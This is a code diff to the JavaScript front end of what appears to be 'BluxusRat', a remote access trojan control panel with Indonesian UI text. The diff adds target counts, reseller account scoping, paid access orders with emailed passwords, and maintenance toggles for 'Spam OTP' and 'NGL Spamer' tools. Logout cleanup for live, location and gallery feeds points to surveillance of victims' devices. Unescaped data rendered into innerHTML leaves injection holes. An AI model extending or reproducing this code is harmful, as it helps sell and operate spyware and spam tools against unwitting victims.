+}
+
 async function loadStats() {
   const box = $("#stat-content");
   try {
     const users = (await fbGet(fbRef(State.db, "users"))).val() || {};
     const targets = (await fbGet(fbRef(State.db, "targets"))).val() || {};
-    let totalUsers = 0, owners = 0, resellers = 0, members = 0, vips = 0, banned = 0;
-    for (const uid in users) {
-      totalUsers++;
-      if (users[uid].role === "owner") owners++;
-      if (users[uid].role === "reseller") resellers++;
-      if (users[uid].role === "member") members++;
-      if (users[uid].role === "vip") vips++;
-      if (users[uid].banned) banned++;
+
+    let myUsers = {};
+    if (State.user.role === "dev") {
+      myUsers = users;
+    } else if (State.user.role === "reseller") {
+      for (const uid in users) {
+        if (users[uid].createdBy === State.uid) myUsers[uid] = users[uid];
+      }
+    } else {
+      myUsers = users;
     }
-    let tt = 0, ot = 0;
-    for (const tid in targets) {
-      tt++;
-      if (targets[tid].status === "online") ot++;
+
+    let total = 0, owners = 0, resellers = 0, vips = 0, members = 0, banned = 0, aktif = 0, expired = 0;
+    for (const uid in myUsers) {
+      const u = myUsers[uid];
+      total++;
+      if (u.role === "owner") owners++;
+      if (u.role === "reseller") resellers++;
+      if (u.role === "vip") vips++;
+      if (u.role === "member") members++;
+      if (u.banned) banned++;
+      if (u.expiresAt && u.expiresAt < Date.now()) expired++;
+      else aktif++;
     }
+
+    let tt = 0;
+    if (State.user.role === "dev") {
+      for (const tid in targets) tt++;
+    }
+
     box.innerHTML = `
       <div class="stat-grid">
-        <div class="stat-card"><div class="l">Total Users</div><div class="v accent">${totalUsers}</div></div>
-        <div class="stat-card"><div class="l">Targets</div><div class="v info">${tt}</div></div>
-        <div class="stat-card"><div class="l">Online</div><div class="v success">${ot}</div></div>
-        <div class="stat-card"><div class="l">Banned</div><div class="v warn">${banned}</div></div>
+        <div class="stat-card"><div class="l">Total Users</div><div class="v accent">${total}</div></div>
+        ${State.user.role === "dev" ? `<div class="stat-card"><div class="l">Total Targets</div><div class="v info">${tt}</div></div>` : ""}
+        <div class="stat-card"><div class="l">Aktif</div><div class="v success">${aktif}</div></div>
+        <div class="stat-card"><div class="l">Expired</div><div class="v warn">${expired}</div></div>
+        <div class="stat-card"><div class="l">Banned</div><div class="v" style="color:var(--error)">${banned}</div></div>
         <div class="stat-card"><div class="l">Owners</div><div class="v accent">${owners}</div></div>
         <div class="stat-card"><div class="l">Resellers</div><div class="v success">${resellers}</div></div>
-        <div class="stat-card"><div class="l">VIP</div><div class="v" style="color:var(--vip)">${vips}</div></div>
+        <div class="stat-card"><div class="l">VIP</div><div class="v vip">${vips}</div></div>
         <div class="stat-card"><div class="l">Members</div><div class="v info">${members}</div></div>
       </div>`;
   } catch (e) {
-    box.innerHTML = '<div style="color:var(--error);font-size:12px">Gagal</div>';
+    box.innerHTML = '<div style="color:var(--error);font-size:12px">Gagal load</div>';
   }
 }
 
-async function loadDB() {
-  const box = $("#db-content");
+async function loadMaintenance() {
+  const box = $("#maint-list");
   try {
-    const nodes = ["users", "targets", "commands", "logs", "broadcasts"];
-    const rows = [];
-    for (const n of nodes) {
-      try {
-        const s = await fbGet(fbRef(State.db, n));
-        const c = s.exists() ? Object.keys(s.val()).length : 0;
-        rows.push(`<div class="list-item" style="margin-bottom:8px;cursor:default"><div class="ico-badge"><i class="fa-solid fa-database"></i></div><div class="txt"><div class="n" style="font-family:'JetBrains Mono',monospace">/${n}</div></div><div style="font-weight:700;color:var(--accent-hover)">${c}</div></div>`);
-      } catch (e) {}
+    const snap = await fbGet(fbRef(State.db, "maintenance"));
+    const m = snap.exists() ? snap.val() : {};
+    const features = [
+      { id: "tolink", name: "To Link" },
+      { id: "spotify", name: "Spotify Preview" },
+      { id: "gempa", name: "Info Gempa" },
+      { id: "ngl", name: "NGL Spamer" },
+      { id: "qr", name: "URL to QR" },
+      { id: "otp", name: "Spam OTP" },
+      { id: "anime", name: "BluxAnime" }
+    ];
+    box.innerHTML = features.map(f => {
+      const isMaint = m[f.id]?.active || false;
+      const msg = m[f.id]?.message || "";
+      return `
+        <div class="toggle-row" style="flex-direction:column;align-items:stretch;gap:10px">
+          <div style="display:flex;align-items:center;justify-content:space-between">
+            <div class="tr-info"><div class="n">${f.name}</div></div>
+            <label class="switch">
+              <input type="checkbox" data-feature="${f.id}" ${isMaint ? "checked" : ""}>
+              <span class="slider"></span>
+            </label>
+          </div>
+          <input type="text" placeholder="Pesan maintenance (opsional)" value="${msg}" data-msg="${f.id}" style="padding:10px;background:var(--bg-app);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:12px">
+        </div>`;
+    }).join("");
+
+    $$("#maint-list input[type='checkbox']").forEach(sw => {
+      sw.onchange = async () => {
+        haptic(10);
+        const feat = sw.dataset.feature;
+        const msgInput = $(`input[data-msg="${feat}"]`);
+        await fbSet(fbRef(State.db, "maintenance/" + feat), {
+          active: sw.checked,
+          message: msgInput.value || "Fitur ini sedang maintenance",
+          updatedAt: Date.now()
+        });
+        toast(`${feat}: ${sw.checked ? "Maintenance" : "Aktif"}`, "ok");
+      };
+    });
+    $$("#maint-list input[data-msg]").forEach(inp => {
+      inp.onblur = async () => {
+        const feat = inp.dataset.msg;
+        const sw = $(`input[data-feature="${feat}"]`);
+        if (sw && sw.checked) {
+          await fbSet(fbRef(State.db, "maintenance/" + feat), {
+            active: true,
+            message: inp.value || "Fitur ini sedang maintenance",
+            updatedAt: Date.now()
+          });
+        }
+      };
+    });
+  } catch (e) {
+    box.innerHTML = '<div style="color:var(--error);font-size:12px;text-align:center;padding:20px">Gagal load</div>';
+  }
+}
+
+async function loadLogs() {
+  const box = $("#logs-content");
+  try {
+    const snap = await fbGet(fbRef(State.db, "logs"));
+    if (!snap.exists()) {
+      box.innerHTML = '<div style="text-align:center;color:var(--text-dim);font-size:12px;padding:20px">Belum ada log</div>';
+      return;
     }
-    box.innerHTML = rows.join("");
-  } catch (e) {}
+    const logs = Object.entries(snap.val())
+      .map(([id, v]) => ({ id, ...v }))
+      .sort((a, b) => b.at - a.at)
+      .slice(0, 50);
+    box.innerHTML = `<div class="console-box">${logs.map(l => `
+      <div class="console-line">
+        <span class="console-ts">[${fmtTime(l.at)}]</span>
+        <span class="console-badge ${l.level || "info"}">${(l.level || "info").toUpperCase()}</span>
+        <span class="console-msg">${l.message || ""}</span>
+      </div>
+    `).join("")}</div>`;
+  } catch (e) {
+    box.innerHTML = '<div style="color:var(--error);font-size:12px;text-align:center;padding:20px">Gagal load</div>';
+  }
+}
+
+// ============================================================
+// EKONOMI + MANAGE ORDER
+// ============================================================
+function goEkonomi() {
+  showScreen("ekonomi");
+}
+
+function goOrder() {
+  showScreen("order");
+  State.order.tab = "pending";
+  State.order.search = "";
+  $("#order-search").value = "";
+  $$("#order-seg button").forEach(b => b.classList.toggle("active", b.dataset.tab === "pending"));
+  loadOrders();
+}
+
+async function loadOrders() {
+  const list = $("#order-list");
+  list.innerHTML = '<div class="skeleton"></div><div class="skeleton"></div>';
+  try {
+    const snap = await fbGet(fbRef(State.db, "orders"));
+    if (!snap.exists()) {
+      list.innerHTML = '<div style="text-align:center;color:var(--text-dim);font-size:12px;padding:40px 20px">Belum ada order</div>';
+      return;
+    }
+    const all = Object.entries(snap.val()).map(([id, v]) => ({ id, ...v }));
+    let filtered = all.filter(o => o.status === State.order.tab);
+    if (State.order.search) {
+      filtered = filtered.filter(o => o.orderId.toLowerCase().includes(State.order.search.toLowerCase()));
+    }
+    filtered.sort((a, b) => b.createdAt - a.createdAt);
+    State.order.items = filtered;
+
+    if (!filtered.length) {
+      list.innerHTML = `<div style="text-align:center;color:var(--text-dim);font-size:12px;padding:40px 20px">Belum ada order ${State.order.tab}</div>`;
+      return;
+    }
+
+    list.innerHTML = filtered.map(o => `
+      <div class="order-item" data-oid="${o.orderId}">
+        <div class="oi-head">
+          <div class="oi-id">${o.orderId}</div>
+          <div class="oi-status ${o.status}">${o.status}</div>
+        </div>
+        <div class="oi-info">
+          <div class="oi-role">${o.roleLabel} · ${o.durationLabel}</div>
+          <div class="oi-price">${fmtPrice(o.price)}</div>
+        </div>
+        <div style="font-size:11px;color:var(--text-dim);margin-top:8px">
+          <div>@${o.username} · ${o.email}</div>
+          <div style="margin-top:2px">${timeAgo(o.createdAt)}</div>
+        </div>
+      </div>
+    `).join("");
+    $$(".order-item").forEach(el => el.onclick = () => {
+      haptic(10);
+      openOrderDetail(el.dataset.oid);
+    });
+  } catch (e) {
+    list.innerHTML = '<div style="text-align:center;color:var(--error);font-size:12px;padding:20px">Gagal load</div>';
+  }
+}
+
+function openOrderDetail(oid) {
+  const o = State.order.items.find(x => x.orderId === oid);
+  if (!o) return;
+  const box = $("#modal-box");
+  box.innerHTML = `
+    <h3>Detail Order</h3>
+    <div class="sub">${o.orderId}</div>
+    <div class="order-detail">
+      <div class="od-row highlight"><span class="l">Status</span><span class="v" style="text-transform:uppercase;color:var(--${o.status === "verified" ? "success" : o.status === "rejected" ? "error" : "warning"})">${o.status}</span></div>
+      <div class="od-row"><span class="l">Role</span><span class="v">${o.roleLabel}</span></div>
+      <div class="od-row"><span class="l">Durasi</span><span class="v">${o.durationLabel}</span></div>
+      <div class="od-row"><span class="l">Harga</span><span class="v">${fmtPrice(o.price)}</span></div>
+      <div class="od-row"><span class="l">Username</span><span class="v">${o.username}</span></div>
+      <div class="od-row"><span class="l">Email</span><span class="v">${o.email}</span></div>
+      <div class="od-row"><span class="l">Dibuat</span><span class="v">${fmtDateTime(o.createdAt)}</span></div>
+      ${o.verifiedAt ? `<div class="od-row"><span class="l">Diverifikasi</span><span class="v">${fmtDateTime(o.verifiedAt)}</span></div>` : ""}
+      ${o.note ? `<div class="od-row"><span class="l">Catatan</span><span class="v">${o.note}</span></div>` : ""}
+    </div>
+    ${o.status === "pending" ? `
+      <div class="field" style="margin-top:14px">
+        <label>Catatan (opsional)</label>
+        <textarea id="order-note" placeholder="Alasan reject / catatan verifikasi..."></textarea>
+      </div>
+      <div class="modal-actions">
+        <button class="btn btn-danger" id="btn-reject-order"><i class="fa-solid fa-xmark"></i> Reject</button>
+        <button class="btn btn-primary" id="btn-verify-order"><i class="fa-solid fa-check"></i> Verifikasi</button>
+      </div>
+    ` : `<div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>`}
+  `;
+  $("#modal").classList.add("show");
+
+  if (o.status === "pending") {
+    $("#btn-verify-order").onclick = () => verifyOrder(o);
+    $("#btn-reject-order").onclick = () => rejectOrder(o);
+  }
+}
+
+async function verifyOrder(o) {
+  haptic(20);
+  if (!confirm(`Verifikasi order ${o.orderId}?\n\nAkun "${o.username}" akan dibuat dengan password random & dikirim ke ${o.email}`)) return;
+  const note = $("#order-note")?.value.trim() || "";
+  try {
+    const usersSnap = await fbGet(fbRef(State.db, "users"));
+    const users = usersSnap.exists() ? usersSnap.val() : {};
+    for (const uid in users) {
+      if (users[uid].username === o.username) {
+        return toast("Username udah dipake, hubungi user", "err");
+      }
+    }
+
+    const pw = genPassword(8);
+    const salt = genSalt();
+    const hash = await sha256(pw + salt);
+    const userCode = genUserCode();
+    const exp = o.duration === -1 ? null : Date.now() + o.duration * 86400000;
+
+    const newRef = fbPush(fbRef(State.db, "users"));
+    await fbSet(newRef, {
+      username: o.username,
+      passwordHash: hash,
+      passwordSalt: salt,
+      role: o.role,
+      userCode,
+      createdBy: State.uid,
+      createdAt: Date.now(),
+      expiresAt: exp,
+      banned: false,
+      avatar: ""
+    });
+
+    await fbUpdate(fbRef(State.db, "orders/" + o.orderId), {
+      status: "verified",
+      verifiedAt: Date.now(),
+      verifiedBy: State.uid,
+      note: note || "Akun dibuat & email terkirim"
+    });
+
+    toast("Mengirim email ke " + o.email + "...", "info");
+    let emailOk = false;
+    try {
+      const htmlBody = buildEmailHTML({
+        username: o.username,
+        password: pw,
+        role: o.roleLabel,
+        duration: o.durationLabel,
+        orderId: o.orderId
+      });
+      await sendEmail({
+        to: o.email,
+        subject: `Akun BluxusRat Kamu — ${o.orderId}`,
+        htmlBody
+      });
+      emailOk = true;
+      toast("Email terkirim ✓", "ok");
+    } catch (e) {
+      console.warn("Email gagal:", e);
+      toast("Email gagal kirim, kirim manual: " + pw, "warn", 8000);
+    }
+
+    const box = $("#modal-box");
+    box.innerHTML = `
+      <h3 style="color:var(--success)">Order Diverifikasi ✓</h3>
+      <div class="sub">${o.orderId}</div>
+      <div class="order-detail">
+        <div class="od-row highlight"><span class="l">Username</span><span class="v">${o.username}</span></div>
+        <div class="od-row highlight"><span class="l">Password</span><span class="v" style="color:var(--accent-hover)">${pw}</span></div>
+        <div class="od-row"><span class="l">Role</span><span class="v">${o.roleLabel}</span></div>
+        <div class="od-row"><span class="l">Durasi</span><span class="v">${o.durationLabel}</span></div>
+        <div class="od-row"><span class="l">Email</span><span class="v">${o.email}</span></div>
+        <div class="od-row"><span class="l">Status Email</span><span class="v" style="color:var(--${emailOk ? "success" : "error"})">${emailOk ? "Terkirim" : "Gagal"}</span></div>
+      </div>
+      <div class="modal-actions">
+        <button class="btn btn-ghost" id="btn-copy-detail"><i class="fa-solid fa-copy"></i> Copy Detail</button>
+        <button class="btn btn-primary" onclick="closeModal();loadOrders()">OK</button>
+      </div>
+    `;
+    $("#btn-copy-detail").onclick = async () => {
+      haptic(10);
+      const text = `Username: ${o.username}\nPassword: ${pw}\nRole: ${o.roleLabel}\nDurasi: ${o.durationLabel}`;
+      const ok = await copyToClipboard(text);
+      toast(ok ? "Detail di-copy" : "Gagal copy", ok ? "ok" : "err");
+    };
+  } catch (e) {
+    toast("Gagal verifikasi: " + e.message, "err");
+  }
+}
+
+async function rejectOrder(o) {
+  haptic(20);
+  if (!confirm(`Reject order ${o.orderId}?`)) return;
+  const note = $("#order-note")?.value.trim() || "";
+  try {
+    await fbUpdate(fbRef(State.db, "orders/" + o.orderId), {
+      status: "rejected",
+      verifiedAt: Date.now(),
+      verifiedBy: State.uid,
+      note: note || "Ditolak oleh admin"
+    });
+    toast(`Order ${o.orderId} di-reject`, "ok");
+    closeModal();
+    loadOrders();
+  } catch (e) {
+    toast("Gagal reject: " + e.message, "err");
+  }
 }
 
 // ============================================================
@@ -1856,21 +2679,25 @@ async function loadDB() {
 function openSettings() {
   const box = $("#modal-box");
   box.innerHTML = `
-    <h3>Settings</h3><div class="sub">Ubah password</div>
+    <h3>Settings</h3><div class="sub">Ubah password & foto profil</div>
     <div class="field"><label>Password Lama</label><input type="password" id="set-old"></div>
     <div class="field"><label>Password Baru</label><input type="password" id="set-new"></div>
     <div class="field"><label>Konfirmasi</label><input type="password" id="set-conf"></div>
     <button class="btn btn-primary" id="btn-save-pw"><i class="fa-solid fa-floppy-disk"></i> Save</button>
+    <div style="height:10px"></div>
+    <button class="btn btn-ghost" id="btn-pick-photo"><i class="fa-solid fa-image"></i> Ganti Foto Profil</button>
+    <input type="file" id="file-photo" accept="image/*" class="hidden">
     <div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Close</button></div>`;
   $("#modal").classList.add("show");
+
   $("#btn-save-pw").onclick = async () => {
     haptic(15);
     const o = $("#set-old").value;
     const n = $("#set-new").value;
     const c = $("#set-conf").value;
-    if (!o || !n) return toast("Isi", "err");
-    if (n !== c) return toast("Konfirm gak cocok", "err");
-    if (n.length < 6) return toast("Min 6", "err");
+    if (!o || !n) return toast("Isi semua field", "err");
+    if (n !== c) return toast("Konfirmasi gak cocok", "err");
+    if (n.length < 6) return toast("Min 6 karakter", "err");
     const oh = await sha256(o + State.user.passwordSalt);
     if (oh !== State.user.passwordHash) return toast("Password lama salah", "err");
     const salt = genSalt();
@@ -1878,8 +2705,24 @@ function openSettings() {
     await fbUpdate(fbRef(State.db, "users/" + State.uid), { passwordHash: hash, passwordSalt: salt });
     State.user.passwordHash = hash;
     State.user.passwordSalt = salt;
-    toast("Diubah", "ok");
+    toast("Password diubah", "ok");
     closeModal();
+  };
+
+  $("#btn-pick-photo").onclick = () => $("#file-photo").click();
+  $("#file-photo").onchange = (e) => {
+    const f = e.target.files[0];
+    if (!f) return;
+    if (f.size > 400000) return toast("Foto max 400KB", "err");
+    const r = new FileReader();
+    r.onload = async (ev) => {
+      const b64 = ev.target.result;
+      State.user.avatar = b64;
+      $("#acc-avatar").src = b64;
+      await fbUpdate(fbRef(State.db, "users/" + State.uid), { avatar: b64 });
+      toast("Foto profil diubah", "ok");
+    };
+    r.readAsDataURL(f);
   };
 }
 
@@ -1887,25 +2730,25 @@ function doLogout() {
   haptic(15);
   const box = $("#modal-box");
   box.innerHTML = `
-    <h3>Log Out</h3><div class="sub">Yakin?</div>
+    <h3>Log Out</h3><div class="sub">Yakin mau keluar dari akun ini?</div>
     <div class="modal-actions">
       <button class="btn btn-ghost" onclick="closeModal()">Batal</button>
-      <button class="btn btn-primary" onclick="confirmLogout()">Log Out</button>
+      <button class="btn btn-primary" id="btn-confirm-logout">Log Out</button>
     </div>`;
   $("#modal").classList.add("show");
-}
-
-function confirmLogout() {
-  localStorage.removeItem("bluxus_uid");
-  State.user = null;
-  State.uid = null;
-  if (State.audio) { State.audio.pause(); State.audio = null; }
-  if (State.unsubLive) State.unsubLive();
-  if (State.unsubLoc) State.unsubLoc();
-  closeModal();
-  showScreen("login");
-  $("#login-usn").value = "";
-  $("#login-pw").value = "";
+  $("#btn-confirm-logout").onclick = () => {
+    localStorage.removeItem("bluxus_uid");
+    State.user = null;
+    State.uid = null;
+    if (State.audio) { State.audio.pause(); State.audio = null; }
+    if (State.unsubLive) State.unsubLive();
+    if (State.unsubLoc) State.unsubLoc();
+    if (State.unsubGallery) State.unsubGallery();
+    closeModal();
+    showScreen("login");
+    $("#login-usn").value = "";
+    $("#login-pw").value = "";
+  };
 }
 
 function closeModal() {
@@ -1918,24 +2761,65 @@ function closeModal() {
 function bindEvents() {
   $("#btn-login").onclick = doLogin;
   $("#login-pw").addEventListener("keydown", e => { if (e.key === "Enter") doLogin(); });
-  
-  ["", "-rat", "-tools", "-account", "-about", "-panel", "-anime"].forEach(suf => {
+  $("#btn-buy-access").onclick = () => { haptic(10); goBuy(); };
+  $("#btn-back-buy").onclick = () => { haptic(8); showScreen("login"); };
+
+  $("#btn-buy-next-1").onclick = () => { haptic(10); renderBuyDurations(); setBuyStep(2); };
+  $("#btn-buy-back-2").onclick = () => { haptic(8); setBuyStep(1); };
+  $("#btn-buy-next-2").onclick = () => { haptic(10); setBuyStep(3); };
+  $("#btn-buy-back-3").onclick = () => { haptic(8); setBuyStep(2); };
+  $("#buy-username").addEventListener("input", validateBuyData);
+  $("#buy-email").addEventListener("input", validateBuyData);
+  $("#btn-buy-next-3").onclick = () => { haptic(15); submitOrder(); };
+  $("#btn-buy-pay").onclick = () => { haptic(15); bayarOrder(); };
+  $("#btn-buy-done").onclick = () => { haptic(8); showScreen("login"); };
+
+  ["", "-rat", "-tools", "-account", "-about", "-panel", "-anime", "-benefit"].forEach(suf => {
     const b = $("#btn-hamburger" + suf);
     if (b) b.onclick = openSidebar;
   });
-  
   $("#sidebar-backdrop").onclick = closeSidebar;
   $$(".sb-item").forEach(el => { el.onclick = () => goPage(el.dataset.page); });
-  
+
+  $("#btn-target-back").onclick = () => { haptic(8); goRat(); };
+  $$(".fp-back").forEach(b => {
+    b.onclick = () => {
+      haptic(8);
+      closeAllFeaturePages();
+      if (State.unsubLive) State.unsubLive();
+      if (State.unsubLoc) State.unsubLoc();
+    };
+  });
+
+  $("#btn-ekonomi-back").onclick = () => { haptic(8); goPanel(); };
+  $("#btn-manage-order").onclick = () => { haptic(10); goOrder(); };
+  $("#btn-order-back").onclick = () => { haptic(8); goEkonomi(); };
+  $$("#order-seg button").forEach(b => {
+    b.onclick = () => {
+      haptic(8);
+      $$("#order-seg button").forEach(x => x.classList.remove("active"));
+      b.classList.add("active");
+      State.order.tab = b.dataset.tab;
+      loadOrders();
+    };
+  });
+  $("#order-search").addEventListener("input", (e) => {
+    clearTimeout(window._ost);
+    window._ost = setTimeout(() => {
+      State.order.search = e.target.value.trim();
+      loadOrders();
+    }, 400);
+  });
+
   $("#btn-settings").onclick = () => { haptic(10); openSettings(); };
   $("#btn-logout").onclick = doLogout;
-  $("#btn-change-photo").onclick = () => { haptic(10); toast("Fitur dalam pengembangan", "info"); };
-  $("#modal").addEventListener("click", e => { if (e.target.id === "modal") closeModal(); });
-  
-  initPlayer();
-  initAnimeEvents();
+  $("#btn-change-photo").onclick = () => { haptic(10); openSettings(); };
 
-  // Copy user code di Rat
+  $("#btn-upgrade-role").onclick = () => {
+    haptic(10);
+    window.open(`https://wa.me/${CONFIG.WA_ADMIN}?text=${encodeURIComponent("Halo, saya mau upgrade role BluxusRat")}`, "_blank");
+  };
+
   $("#btn-copy-usercode").onclick = async () => {
     haptic(20);
     const code = State.user?.userCode || "";
@@ -1954,6 +2838,11 @@ function bindEvents() {
       toast("Gagal copy", "err");
     }
   };
+
+  $("#modal").addEventListener("click", e => { if (e.target.id === "modal") closeModal(); });
+
+  initPlayer();
+  initAnimeEvents();
 }
 
 // ============================================================
@@ -1983,4 +2872,3 @@ async function init() {
 
 window.addEventListener("DOMContentLoaded", init);
 window.closeModal = closeModal;
-window.confirmLogout = confirmLogout;
